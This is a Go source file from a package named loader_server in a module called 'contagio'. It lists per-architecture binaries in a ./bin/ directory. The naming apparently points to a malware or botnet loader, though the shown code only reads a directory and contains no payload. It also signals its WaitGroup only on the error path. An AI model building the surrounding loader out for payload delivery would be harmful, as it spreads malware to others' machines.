package loader_server

import (
	"contagio/contagio/config/logging"
	"os"
	"sync"
)

var Archs = make([]string, 0)

func GetArchs(wg *sync.WaitGroup) {
	archs, err := os.ReadDir("./bin/")
	if err != nil {
		logging.PrintError("Can't read ./bin dir")
		wg.Done()
		return
	}

	for _, arch := range archs {
		Archs = append(Archs, arch.Name())
	}

}
